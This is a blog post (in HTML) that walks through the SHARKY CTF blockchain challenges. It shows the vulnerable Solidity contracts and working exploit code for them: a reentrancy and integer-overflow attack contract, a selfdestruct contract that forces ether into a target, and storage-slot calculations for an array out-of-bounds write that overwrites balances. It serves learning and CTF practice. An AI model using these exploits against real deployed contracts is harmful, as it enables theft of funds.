<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
  </script>

  <meta name="description" content="复现SHARKY CTF BLOCKCHAIN的赛题">
<meta property="og:type" content="article">
<meta property="og:title" content="SHARKY CTF BLOCKCHAIN">
<meta property="og:url" content="https://zpano.cn/2021/09/10/27/index.html">
<meta property="og:site_name" content="Zpano&#39;s Blog">
<meta property="og:description" content="复现SHARKY CTF BLOCKCHAIN的赛题">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210908182212140.png">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210908182847638.png">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210909124440662.png">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210910211904766.png">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210910213845520.png">
<meta property="og:image" content="https://zpano.cn/2021/09/10/27/image-20210910213858460.png">
<meta property="article:published_time" content="2021-09-10T13:41:38.000Z">
<meta property="article:modified_time" content="2021-09-10T13:43:55.000Z">
<meta property="article:author" content="Zpano">
<meta property="article:tag" content="区块链安全">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zpano.cn/2021/09/10/27/image-20210908182212140.png">


<link rel="canonical" href="https://zpano.cn/2021/09/10/27/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>SHARKY CTF BLOCKCHAIN | Zpano's Blog</title>
  






  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
<!-- hexo injector head_end end --></head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Zpano's Blog</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <section class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">0x01 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-WARMUP"><span class="nav-number">2.</span> <span class="nav-text">0x02 WARMUP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-LOGIC"><span class="nav-number">3.</span> <span class="nav-text">0x03 LOGIC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-GUESSING"><span class="nav-number">4.</span> <span class="nav-text">0x04 GUESSING</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-MULTIPASS"><span class="nav-number">5.</span> <span class="nav-text">0x05 MULTIPASS</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06-SHASHASHA"><span class="nav-number">6.</span> <span class="nav-text">0x06 SHASHASHA</span></a></li></ol></div>
        </section>
        <!--/noindex-->

        <section class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Zpano"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Zpano</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">33</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="cc-license site-overview-item animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



        </section>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">
      

      

  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2021/09/10/27/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Zpano">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Zpano's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SHARKY CTF BLOCKCHAIN
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2021-09-10 21:41:38 / 修改时间：21:43:55" itemprop="dateCreated datePublished" datetime="2021-09-10T21:41:38+08:00">2021-09-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>5.6k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

            <div class="post-description">复现SHARKY CTF BLOCKCHAIN的赛题</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>复现一下SHARKY CTF BLOCKCHAIN的赛题，提升一下自己</p>
<h1 id="0x02-WARMUP"><a href="#0x02-WARMUP" class="headerlink" title="0x02 WARMUP"></a>0x02 WARMUP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Warmup &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        locked &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function unlock() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.005 ether);</span><br><span class="line">        locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(!locked);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Just a warmup challenge, this need us to deloy the contract on remix and invoke the unlock function with 0.005 ether to put unlock to false, so that we can invoke withdraw() to get flag~</p>
<p>这个很简单，先调用unlock函数，再调用withdraw函数就可以了</p>
<h1 id="0x03-LOGIC"><a href="#0x03-LOGIC" class="headerlink" title="0x03 LOGIC"></a>0x03 LOGIC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Logic &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    bytes32 private passphrase &#x3D; &quot;th3 fl4g 1s n0t h3r3&quot;;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;  </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.05 ether &amp;&amp; _secret &#x3D;&#x3D; passphrase);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Same as warmup, we should steal all money~</p>
<p>读取一下通过浏览器passphrase即可</p>
<p><img src="/2021/09/10/27/image-20210908182212140.png" alt="image-20210908182212140"></p>
<h1 id="0x04-GUESSING"><a href="#0x04-GUESSING" class="headerlink" title="0x04 GUESSING"></a>0x04 GUESSING</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Guessing &#123;</span><br><span class="line">    address public owner;    </span><br><span class="line">    bytes32 private passphrase;</span><br><span class="line">     </span><br><span class="line">    constructor(bytes32 _passphrase) public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        passphrase &#x3D; keccak256(abi.encodePacked(_passphrase));</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function claim(bytes32 _secret) public payable &#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(_secret)) &#x3D;&#x3D; passphrase);</span><br><span class="line">        owner &#x3D; msg.sender; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依旧和上一题差不多</p>
<p><img src="/2021/09/10/27/image-20210908182847638.png" alt="image-20210908182847638"></p>
<h1 id="0x05-MULTIPASS"><a href="#0x05-MULTIPASS" class="headerlink" title="0x05 MULTIPASS"></a>0x05 MULTIPASS</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Multipass &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public money;</span><br><span class="line">     </span><br><span class="line">    mapping(address &#x3D;&gt; int256) public contributions;</span><br><span class="line">     </span><br><span class="line">    bool public withdrawn;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        contributions[msg.sender] &#x3D; int256(msg.value * 900000000000000000000);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        money &#x3D; msg.value;</span><br><span class="line">        withdrawn &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function gift() public payable &#123;</span><br><span class="line">        require(contributions[msg.sender] &#x3D;&#x3D; 0 &amp;&amp; msg.value &#x3D;&#x3D; 0.00005 ether);</span><br><span class="line">        contributions[msg.sender] &#x3D; int256(msg.value) * 10;</span><br><span class="line">        money +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function takeSomeMoney() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner &amp;&amp; withdrawn &#x3D;&#x3D; false);</span><br><span class="line">        uint256 someMoney &#x3D; money&#x2F;20;</span><br><span class="line">        if(msg.sender.call.value(someMoney)())&#123;</span><br><span class="line">            money -&#x3D; someMoney;</span><br><span class="line">        &#125;</span><br><span class="line">        withdrawn &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function contribute(int256 _factor) public &#123;</span><br><span class="line">        require(contributions[msg.sender] !&#x3D; 0 &amp;&amp; _factor &lt; 10);</span><br><span class="line">        contributions[msg.sender] *&#x3D; _factor;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function claimContract() public &#123;</span><br><span class="line">        require(contributions[msg.sender] &gt; contributions[owner]);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Another Steal money task of course XD.</p>
<p>整数溢出</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    Multipass x;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x = Multipass(address contract);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">prepare</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        x.gift.value(<span class="number">0.00005</span> ether)();</span><br><span class="line">        x.contribute(-<span class="number">100000000000</span>);</span><br><span class="line">        x.contribute(-<span class="number">100000000000</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Claim</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x.claimContract();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reEntry</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x.takeSomeMoney();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        x.takeSomeMoney(); <span class="comment">//reEntry</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Prepare()-&gt;Claim-&gt;reEntry</p>
<h1 id="0x06-SHASHASHA"><a href="#0x06-SHASHASHA" class="headerlink" title="0x06 SHASHASHA"></a>0x06 SHASHASHA</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Shashasha &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public money;</span><br><span class="line">     </span><br><span class="line">    mapping(address &#x3D;&gt; uint256) private contributions;    </span><br><span class="line">     </span><br><span class="line">    bool public hacker;</span><br><span class="line">    uint[] public godlike;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        contributions[owner] &#x3D; msg.value * 9999999999999;</span><br><span class="line">        money +&#x3D; msg.value;</span><br><span class="line">        hacker &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function becomingHacker() public &#123;</span><br><span class="line">        require(address(this).balance !&#x3D; money);</span><br><span class="line">        contributions[msg.sender] &#x3D; 100;</span><br><span class="line">        hacker &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function remove() public&#123;</span><br><span class="line">        require(hacker);</span><br><span class="line">        godlike.length--;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function append(uint256 _value) public&#123;</span><br><span class="line">        require(hacker);</span><br><span class="line">        godlike.push(_value);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function update(uint256 _key, uint256 _value) public &#123;</span><br><span class="line">        require(hacker);        </span><br><span class="line">        godlike[_key] &#x3D; _value;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(contributions[msg.sender] &gt; contributions[owner]);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function getContrib(address _key) public view returns(uint256) &#123;</span><br><span class="line">        return contributions[_key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The last steal money task, and really fucking hard! o(╥﹏╥)o</p>
<p>要想成为hack需要先hacker = true，也就是address(this).balance != money，但是合约的默认函数不是payable，我们就没有办法直接发送。想到了selfdestruct。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    function destory()&#123;</span><br><span class="line">        selfdestruct(address contract);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时调用becomingHacker()函数就可以成功</p>
<p>在注意到 remove()可以通过多次调用实现整数减法溢出，我们就可以实现数组越界访问</p>
<p><img src="/2021/09/10/27/image-20210909124440662.png" alt="image-20210909124440662"></p>
<p>接下去就是寻找contributions映射的位置去修改owner的数值，先计算contributions[owner]对应的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">key=<span class="number">0x0b896C359adF4BB1c19c7dfd41Dc35dc9216E470</span></span><br><span class="line">a=byte32(key)+byte32(<span class="number">2</span>)</span><br><span class="line">b=sha3.keccak_256(a).hexdigest()</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#814b2098a804d4eb037abd074ad95f52b2b58dfc0d6ea8162adc21fe54e9f0b6</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/10/27/image-20210910211904766.png" alt="image-20210910211904766"></p>
<p>再计算godlike[attack]对应的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">b=sha3.keccak_256(byte32(<span class="number">4</span>)).hexdigest()</span><br><span class="line"><span class="comment">#8a35acfbc15ff81a39ae7d344fd709f28e8600b4aa8c65c6b64bfe7fe36bd19b</span></span><br></pre></td></tr></table></figure>
<p>根据公示计算偏移的位置</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="built_in">hex</span>(<span class="number">2</span>**<span class="number">256</span>-<span class="number">0x8a35acfbc15ff81a39ae7d344fd709f28e8600b4aa8c65c6b64bfe7fe36bd19b</span>+<span class="number">0x814b2098a804d4eb037abd074ad95f52b2b58dfc0d6ea8162adc21fe54e9f0b6</span>))</span><br><span class="line"><span class="comment">#0xf715739ce6a4dcd0c9cc3fd2fb025560242f8d4762e2424f7490237e717e1f1b</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/10/27/image-20210910213845520.png" alt="image-20210910213845520"></p>
<p><img src="/2021/09/10/27/image-20210910213858460.png" alt="image-20210910213858460"></p>
<p>此时我们就可以实现contributions[msg.sender] &gt; contributions[owner]，从而调用withdraw函数，达到题目要我们实现的目的。</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>Zpano
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://zpano.cn/2021/09/10/27/" title="SHARKY CTF BLOCKCHAIN">https://zpano.cn/2021/09/10/27/</a>
  </li>
  <li class="post-copyright-license">
